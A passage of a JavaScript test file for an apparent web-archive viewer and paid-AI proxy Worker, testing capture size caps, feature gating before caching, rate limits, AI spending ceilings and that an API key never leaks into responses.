  const ok = { 'web.archive.org/web/20240101000000if_/https://x.gov/a': () => new Response(null, redirect('https://web.archive.org/web/20240101000000if_/https://x.gov/b')), 'web.archive.org/web/20240101000000if_/https://x.gov/b': () => new Response('landed', { headers: { 'content-type': 'text/plain' } }) };
  const good = await call('https://web.archive.org/web/20240101000000/https://x.gov/a', ok);
  assert.equal(good.status, 200); assert.equal(await good.text(), 'landed');
});
test('archive viewer: oversized captures are refused or cut by the server, by declared length and while streaming', async () => {
  withCaches();
  const env = baseEnv({ LIMIT_VIEWCAPTURE_MAX_BYTES: '2048' });
  const u = 'https://web.archive.org/web/20240101000000/https://x.gov/'; let i = 0;
  const declared = { 'web.archive.org/web/20240101000000if_/https://x.gov/': () => new Response('x', { headers: { 'content-type': 'application/pdf', 'content-length': '999999' } }) };
  assert.equal((await vc(u, { ip: `192.0.2.${150 + i++}` }, env, declared)).status, 413);
  const html = { 'web.archive.org/web/20240101000000if_/https://x.gov/': () => new Response('<html>' + 'a'.repeat(50_000) + '</html>', { headers: { 'content-type': 'text/html' } }) };
  assert.equal((await vc(u, { ip: `192.0.2.${150 + i++}` }, env, html)).status, 413, 'HTML with no declared length is counted while reading');
  const liar = { 'web.archive.org/web/20240101000000if_/https://x.gov/': () => new Response(new Uint8Array(50_000).fill(65), { headers: { 'content-type': 'application/pdf', 'content-length': '10' } }) };
  const r = await vc(u, { ip: `192.0.2.${150 + i++}` }, env, liar);
  await assert.rejects(async () => { await r.arrayBuffer(); }, 'a stream that exceeds the cap is aborted, whatever length it declared');
  assert.equal(limitsFor(baseEnv({ LIMIT_VIEWCAPTURE_MAX_BYTES: '999999999' }), 'viewCapture').maxBytes, 15 * 1024 * 1024);
});
test('archive viewer: gating comes before the cache, so switching a feature off stops cached content too', async () => {
  withCaches();
  const pages = { 'web.archive.org/web/20240101000000if_/https://x.gov/': { body: 'hello', headers: { 'content-type': 'text/plain' } } };
  const u = 'https://web.archive.org/web/20240101000000/https://x.gov/';
  const ctx = { pending: [], waitUntil(p) { this.pending.push(p); } };
  const mk = (env, ip) => handleViewCapture(req(`http://w/api/view-capture?url=${encodeURIComponent(u)}`, { headers: { 'cf-connecting-ip': ip } }), env, ctx, { fetchImpl: archiveStub(pages) });
  assert.equal((await mk(baseEnv(), '192.0.2.170')).status, 200); await Promise.all(ctx.pending);
  assert.equal((await mk(baseEnv({ FEATURE_VIEW_CAPTURE: 'off' }), '192.0.2.171')).status, 404, 'off means off, even for a cached capture');
  const cached = await mk(baseEnv(), '192.0.2.172'); assert.equal(cached.status, 200); assert.match(cached.headers.get('content-security-policy'), /default-src 'none'/, 'cached responses keep their isolation headers');
});
test('archive viewer: rate limit and concurrency are enforced by the server', async () => {
  withCaches(); _inflightForTests.clear();
  const env = baseEnv({ LIMIT_VIEWCAPTURE_PER_IP_PER_MIN: '2' });
  const pages = { 'web.archive.org/web/20240101000000if_/https://x.gov/': { body: 'hi', headers: { 'content-type': 'text/plain' } } };
  const u = 'https://web.archive.org/web/20240101000000/https://x.gov/';
  const codes = []; for (let i = 0; i < 4; i++) codes.push((await vc(u, { ip: '192.0.2.222' }, env, pages)).status);
  assert.deepEqual(codes, [200, 200, 429, 429]);
});

// ---------- AI protection ----------
test('paid AI: per-visitor and global daily ceilings are enforced by the Worker; a missing ceiling means unavailable', async () => {
  withCaches();
  const env = baseEnv({ AI_PER_VISITOR_PER_DAY: '2', AI_DAILY_CEILING: '3' });
  const call = (ip, kind = 'qualitative') => aiRouteGuard(req('http://w/api/analyze/x', { method: 'POST', headers: { 'content-length': '500', 'cf-connecting-ip': ip } }), env, kind);
  assert.equal(await call('203.0.113.1'), null); assert.equal(await call('203.0.113.1'), null);
  const third = await call('203.0.113.1'); assert.equal(third.status, 429); assert.equal((await third.json()).error, 'daily-limit');
  assert.equal(await call('203.0.113.2'), null, 'another visitor has their own allowance');
  const g = await call('203.0.113.3'); assert.equal(g.status, 503, 'the global daily ceiling is shared by both AI routes and all visitors');
  assert.equal((await call('203.0.113.4', 'ask-sources')).status, 503);
});
test('paid AI: caller, method and body-size checks come before any spending', async () => {
  withCaches();
  const env = baseEnv();
  const mk = (o) => req('http://w/api/analyze/x', { method: 'POST', headers: { 'content-length': '500', 'cf-connecting-ip': '203.0.113.9', ...(o.headers || {}) }, site: o.site === undefined ? 'same-origin' : o.site, method: o.method || 'POST' });
  assert.equal((await aiRouteGuard(mk({ site: null }), env, 'qualitative')).status, 403);
  assert.equal((await aiRouteGuard(mk({ site: 'cross-site' }), env, 'qualitative')).status, 403);
  assert.equal((await aiRouteGuard(req('http://w/x', { method: 'GET' }), env, 'qualitative')).status, 405);
  assert.equal((await aiRouteGuard(mk({ headers: { 'content-length': '999999' } }), env, 'qualitative')).status, 413);
  const none = req('http://w/x', { method: 'POST' }); assert.equal((await aiRouteGuard(none, env, 'qualitative')).status, 411);
});
test('credentials never appear in any guard, gate or proxy response', async () => {
  withCaches();
  const SECRET = 'sk-ant-api03-THIS-MUST-NEVER-APPEAR';
  const env = baseEnv({ ANTHROPIC_API_KEY: SECRET });
  const bodies = [];
  const collect = async (r) => { bodies.push(await r.clone().text(), JSON.stringify([...r.headers])); };
  await collect(handleFeatures(req('http://w/api/features'), env));
  await collect(await handleFetch(req('http://w/api/fetch?url=https://records.example.gov/x', { site: null }), env));
  await collect(await handleCaptures(req('http://w/api/captures?url=nope'), env));
  await collect(await aiRouteGuard(req('http://w/x', { method: 'POST', site: null, headers: { 'content-length': '5' } }), env, 'qualitative'));
  await collect(await aiRouteGuard(req('http://w/x', { method: 'POST', headers: { 'content-length': '5' } }), { ...env, AI_DAILY_CEILING: undefined }, 'qualitative'));
  await collect(featureGate({ ...env, ENVIRONMENT: undefined }, 'ai') || new Response('x'));
  await collect(await handleViewCapture(req('http://w/api/view-capture?url=https://web.archive.org/x', { dest: 'document' }), env, {}));
  assert.ok(bodies.every((b) => !b.includes(SECRET) && !b.includes('ANTHROPIC')), 'no response mentions a credential');
});
